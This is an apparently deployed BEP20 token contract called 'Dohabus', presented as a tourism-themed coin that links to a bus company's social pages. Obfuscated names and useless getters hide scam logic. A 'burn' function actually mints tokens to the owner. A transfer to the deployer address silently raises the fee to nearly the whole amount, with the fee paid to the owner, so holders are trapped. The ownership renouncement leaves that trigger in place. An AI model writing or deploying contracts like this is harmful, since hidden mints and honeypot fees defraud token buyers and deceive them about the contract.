/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

/////////////////////////////////////////
//Let this wonderful occasion remind us to take a moment to 
//appreciate the wonderful experiences and knowledge that travel gives. 
//Happy World Tourism Day! ?
//https://dohabus.com/
//https://youtu.be/pJUpPtBiPHc
//https://twitter.com/khalidjassem74
//https://www.facebook.com/DohaBus/
/////////////////////////////////////////
pragma solidity >=0.5.0;
contract Dohabus {
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant YBRGDY = 99999;
uint256 private  JMMNLF = 1000000000000000000000;
uint256 private  DWYVVI = 1000000000000000;
address private  UGUTWU = address(0);
uint256 private  ENYDOP = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  ZAFCVI = 10000000000;
address private  YPCMWX = address(0);
uint256 private  UWBNGN = 10000000000000;
string public  name = "Dohabus";
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => uint256) public balanceOf;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "Dohabus";
uint8 public constant decimals = 18;
address private  AQRJLO = address(0);
uint256 private  VLCXFQ = 1000000000000000000;
address private  HOGQVU = address(0);
uint256 private  ELNZTD = 100000000;
address private  GPYHDX = address(0);
function _getYPCMWX() private returns (address) {
return YPCMWX;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getELNZTD() private returns (uint256) {
return ELNZTD;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getJMMNLF() private returns (uint256) {
return JMMNLF;
}

function _getHOGQVU() private returns (address) {
return HOGQVU;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tJLTJSV 0");
require(spender != address(0), "fJLTJSV 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getUGUTWU() private returns (address) {
return UGUTWU;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getZAFCVI() private returns (uint256) {
return ZAFCVI;
}

function _getDWYVVI() private returns (uint256) {
return DWYVVI;
}

function _getUWBNGN() private returns (uint256) {
return UWBNGN;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getVLCXFQ() private returns (uint256) {
return VLCXFQ;
}

constructor () public {
GPYHDX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getAQRJLO() private returns (address) {
return AQRJLO;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "JLTJSV");
require(to != address(0), "JLTJSV");
require(amount <= balanceOf[from], "JLTJSV");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* YBRGDY/ENYDOP ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==GPYHDX){
ENYDOP = YBRGDY+2;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}